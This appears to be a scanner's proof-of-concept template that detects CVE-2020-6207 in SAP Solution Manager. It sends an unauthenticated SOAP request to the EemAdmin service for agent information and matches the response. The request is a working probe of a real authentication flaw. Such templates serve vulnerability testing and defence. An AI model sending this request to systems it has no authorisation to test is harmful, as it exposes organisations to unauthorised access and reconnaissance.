Poc/SAP-Solution-Manager-CVE-2020-6207.yaml

id:
name: CVE-2020-6207
transport: http
tags:
  - SAP
rules:
  req:
    request:
      cache: true
      method: POST
      path: /EemAdminService/EemAdmin
      headers:
        Content-Type: text/xml; charset=UTF-8
        Connection: close
      body: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/"><soapenv:Header/><soapenv:Body><adm:getAllAgentInfo/></soapenv:Body></soapenv:Envelope>
    expression: response.status==200 &&
                response.body.bcontains(b':Envelope') &&
                response.body.bcontains(b':Body') &&
                response.body.bcontains(b':getAllAgentInfoResponse') &&
                response.content_type.contains('text/xml') &&
                response.raw_header.bcontains(b'SAP NetWeaver Application Server')
expression: req()
detail:
  vulnerability:
    proof:
      info: "存在CVE-2020-6207漏洞"